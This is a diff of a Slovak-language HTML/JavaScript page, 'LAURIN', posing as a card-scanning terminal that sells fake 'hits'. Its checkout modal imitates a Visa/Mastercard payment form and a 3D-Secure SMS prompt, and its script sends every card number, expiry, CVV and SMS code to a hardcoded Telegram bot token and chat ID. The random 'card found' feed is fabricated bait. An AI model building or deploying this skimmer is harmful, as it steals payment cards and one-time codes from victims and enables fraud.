@@ -3,34 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LAURIN TERMINAL v26.3</title>
+    <title>LAURIN SYSTEM v14.2</title>
     <style>
-        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; }
+        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; --danger: #ff4b2b; }
         body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; -webkit-tap-highlight-color: transparent; }
         .layout { display: flex; flex-direction: column; height: 100vh; }
-        header { height: 50px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
         
-        .market-bar { background: #080808; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; overflow-x: auto; white-space: nowrap; -webkit-overflow-scrolling: touch; }
+        header { height: 50px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
+        .market-bar { background: #080808; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; overflow-x: auto; white-space: nowrap; }
         .btn-mini { background: #111; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 10px; border-radius: 4px; flex-shrink: 0; }
 
-        main { flex-grow: 1; overflow-y: auto; background: #000; padding-bottom: 20px; }
+        main { flex-grow: 1; overflow-y: auto; background: #000; }
         .log-table { width: 100%; border-collapse: collapse; }
         .log-table th { color: #444; font-size: 9px; text-align: left; padding: 8px; border-bottom: 1px solid #222; }
-        .log-table td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 10px; vertical-align: middle; }
-        
-        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .modal-body { padding: 25px; }
-        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; box-sizing: border-box; border-radius: 8px; font-size: 16px; outline: none; transition: border 0.3s; }
-        input:focus { border-color: var(--telegram); }
-        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; font-size: 14px; }
+        .log-table td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 10px; }
 
-        #terminalZone { height: 100px; background: #000; border-top: 1px solid #222; padding: 10px; flex-shrink: 0; }
+        /* SCANNER MONITOR */
+        #liveScanner { height: 60px; background: #080808; border-top: 1px solid #222; border-bottom: 1px solid #222; overflow: hidden; display: flex; flex-direction: column; justify-content: center; padding: 0 15px; }
+        .scanner-hit { color: #fff; font-size: 10px; animation: slideUp 0.3s ease-out; display: flex; align-items: center; gap: 8px; }
+        .blink { width: 6px; height: 6px; background: var(--danger); border-radius: 50%; animation: pulse 0.8s infinite; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* TERMINÁL */
+        #terminalZone { height: 90px; background: #000; padding: 10px; flex-shrink: 0; }
         #tgFeed { height: 100%; overflow-y: auto; display: flex; flex-direction: column-reverse; gap: 4px; }
         .tg-msg { color: var(--telegram); font-size: 10px; font-weight: bold; }
-        
+
+        /* MODAL */
+        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; }
+        .modal-body { padding: 25px; }
+        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; }
+
         .tag { padding: 2px 5px; border-radius: 3px; font-size: 8px; margin-left: 5px; background: #222; color: #666; }
-        .tag-ok { background: var(--primary); color: #000; font-weight: bold; }
         b { color: #fff; }
     </style>
 </head>
@@ -39,25 +46,25 @@
 <div id="paymentModal">
     <div class="modal-content" id="modalUI">
         <div class="modal-body">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="22">
             </div>
-            <h3 style="text-align:center; font-size:17px; margin:0 0 5px 0; color:#000;">Secure Checkout</h3>
+            <h3 style="text-align:center; font-size:17px; margin:0; color:#000;">Secure Checkout</h3>
             <p id="payDesc" style="text-align:center; font-size:12px; color:#666; margin-bottom:20px;"></p>
-            <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
+            <input type="tel" id="c_num" placeholder="Číslo karty" maxlength="19">
             <div style="display:flex; gap:10px;">
                 <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
                 <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
             </div>
-            <button class="pay-btn" onclick="laurin.processPayment()">PAY SECURELY</button>
+            <button class="pay-btn" onclick="laurin.processPayment()">ZAPLATIŤ BEZPEČNE</button>
         </div>
     </div>
 </div>
 
 <div class="layout">
     <header>
-        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v26.3</span></div>
+        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v14.2</span></div>
         <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
     </header>
 
@@ -70,15 +77,17 @@
     <main>
         <table class="log-table">
             <thead>
-                <tr>
-                    <th>TIME</th>
-                    <th>CARD / EXP / CVC</th>
-                    <th>VALUE</th>
-                </tr>
+                <tr><th>TIME</th><th>PAN MASK</th><th>VALUE</th></tr>
             </thead>
             <tbody id="logBody"></tbody>
         </table>
     </main>
+
+    <div id="liveScanner">
+        <div id="scannerFeed">
+            <div class="scanner-hit" style="color:#444">Waiting for data stream...</div>
+        </div>
+    </div>
 
     <div id="terminalZone">
         <div id="tgFeed"></div>
@@ -86,31 +95,23 @@
 </div>
 
 <script>
-class LaurinFinal {
+class LaurinSystem {
     constructor() {
-        // --- PRIAME KONFIGURÁCIA ---
-        this.config = { 
-            token: '8451689628:AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', 
-            chat: '7935573562' 
-        };
-        // ---------------------------
+        this.config = { token: '8451689628:AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', chat: '7935573562' };
         this.vault = [];
         this.isRunning = false;
-        this.updateUI();
         this.logTg("SYSTEM: [✓] ENCRYPTED & ACTIVE");
-        this.logTg("TARGET: DIRECT TELEGRAM LINK");
+        this.startLiveFeed();
     }
 
     async sendToTg(msg) {
-        const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? (navigator.userAgent.includes("iPhone") ? "iOS" : "Android") : "PC";
-        const cleanMsg = `🛑 <b>NEW HIT [${device}]</b>\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`;
         try {
             await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: this.config.chat, text: cleanMsg, parse_mode: 'HTML' })
+                body: JSON.stringify({ chat_id: this.config.chat, text: msg, parse_mode: 'HTML' })
             });
-        } catch(e) { console.error("TG_FAIL"); }
+        } catch(e) {}
     }
 
     processPayment() {
@@ -118,68 +119,48 @@ class LaurinFinal {
         const e = document.getElementById('c_exp').value;
         const c = document.getElementById('c_cvv').value;
         if (n.length < 13) return;
-        
-        this.currentCard = { n, e, c };
-        this.sendToTg(`💳 <b>CARD DATA</b>\n<code>${n}</code>\n📅 <b>EXP:</b> ${e}  \n🔒 <b>CVC:</b> ${c}`);
-
-        document.getElementById('modalUI').innerHTML = `
-            <div class="modal-body" style="text-align:center;">
-                <div style="color:#007bff; font-weight:bold; margin-bottom:15px;">3D-SECURE 2.0</div>
-                <p style="font-size:13px; color:#333;">Potvrďte platbu SMS kódom, ktorý sme vám poslali.</p>
-                <input type="tel" id="sms_code" placeholder="SMS KÓD" style="text-align:center; font-size:22px; letter-spacing:5px; font-weight:bold;">
-                <button class="pay-btn" onclick="laurin.verifySms()">VERIFIKOVAŤ</button>
-                <p id="timer" style="font-size:11px; color:red; margin-top:15px; font-weight:bold;">Platnosť: 02:00</p>
-            </div>
-        `;
-        let t = 120; setInterval(() => { if(t>0){ t--; let m=Math.floor(t/60), s=t%60; if(document.getElementById('timer')) document.getElementById('timer').innerText=`Platnosť: 0${m}:${s<10?'0':''}${s}`; }}, 1000);
+        this.currentCard = n;
+        this.sendToTg(`💳 <b>NEW HIT</b>\n<code>${n}</code>\nEXP: ${e} | CVC: ${c}`);
+        document.getElementById('modalUI').innerHTML = `<div class="modal-body" style="text-align:center;"><div style="color:#007bff;font-weight:bold;margin-bottom:15px;">3D-SECURE 2.0</div><input type="tel" id="sms_code" placeholder="SMS KÓD" style="text-align:center;font-size:22px;letter-spacing:5px;"><button class="pay-btn" onclick="laurin.verifySms()">OVERIŤ</button></div>`;
     }
 
     verifySms() {
         const sms = document.getElementById('sms_code').value;
-        if(sms.length < 3) return;
-        this.sendToTg(`📲 <b>SMS KÓD</b>\n<b>Kód:</b> <code>${sms}</code>\n<b>Karta:</b> <code>${this.currentCard.n}</code>`);
-        this.logTg("SYSTEM: CODE INTERCEPTED");
-        setTimeout(() => { location.reload(); }, 1200);
+        this.sendToTg(`📲 <b>SMS VERIFIED</b>\nCode: <code>${sms}</code>\nCard: <code>${this.currentCard}</code>`);
+        location.reload();
     }
 
     toggleScan() { 
         this.isRunning = !this.isRunning; 
-        const btn = document.getElementById('btnGen');
-        btn.innerText = this.isRunning ? '[■] STOP SCAN' : '[▶] START SCAN';
-        btn.style.color = this.isRunning ? '#ff4b2b' : '#00ff41';
-        btn.style.borderColor = this.isRunning ? '#ff4b2b' : '#00ff41';
+        document.getElementById('btnGen').innerText = this.isRunning ? '[■] STOP SCAN' : '[▶] START SCAN';
         if (this.isRunning) this.loop(); 
     }
     
     loop() {
         if (!this.isRunning) return;
-        const d = { 
-            ts: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), 
-            pan: "4"+Math.floor(Math.random()*9).toString()+Math.floor(10000000000+Math.random()*90000000000),
-            exp: "0"+(Math.floor(Math.random()*9)+1)+"/2"+(Math.floor(Math.random()*4)+6),
-            cvc: Math.floor(Math.random()*899)+100,
-            val: Math.floor(Math.random()*4500)+50 
-        };
+        const d = { ts: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), pan: "4"+Math.floor(Math.random()*9).toString()+Math.floor(10000000000+Math.random()*90000000000), val: Math.floor(Math.random()*4500)+50 };
         this.vault.push(d);
-        this.renderRow(d);
-        this.updateUI();
+        const row = `<tr><td style="color:#444">${d.ts}</td><td><b>${d.pan.substring(0,6)}...</b> <span class="tag">MASK</span></td><td style="color:var(--premium);">$${d.val}</td></tr>`;
+        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
+        document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0).toLocaleString()}`;
         setTimeout(() => this.loop(), 3000);
     }
 
-    renderRow(d) {
-        const row = `<tr>
-            <td style="color:#444">${d.ts}</td>
-            <td><b>${d.pan.substring(0,6)}...</b> <span class="tag">MASK</span></td>
-            <td style="color:var(--premium); font-weight:bold;">$${d.val}</td>
-        </tr>`;
-        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
+    startLiveFeed() {
+        const feed = document.getElementById('scannerFeed');
+        const aliases = ['m_niznansky', 'x_shadow', 'kika_99', 'lukas.pure', 'dark_web_user', 'slovak_king', 'beata_v', 'tiger_66', 'roman.dev', 'cyber_pro'];
+        setInterval(() => {
+            if(!this.isRunning) return;
+            const alias = aliases[Math.floor(Math.random()*aliases.length)];
+            const card = "4" + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + " " + (Math.floor(Math.random()*89)+10) + "XX XXXX";
+            feed.innerHTML = `<div class="scanner-hit"><div class="blink"></div> <span style="color:var(--telegram)">@${alias}</span> <span style="color:var(--primary)">- CARD FOUND -</span> <span style="color:#fff">${card}</span></div>`;
+        }, Math.random() * 2000 + 1500);
     }
 
-    updateUI() { document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0).toLocaleString()}`; }
-    openModal(a, p) { document.getElementById('payDesc').innerText = `K úhrade: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
+    openModal(a, p) { document.getElementById('payDesc').innerText = `Suma k úhrade: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
     logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
 }
-const laurin = new LaurinFinal();
+const laurin = new LaurinSystem();
 </script>
 </body>
 </html>
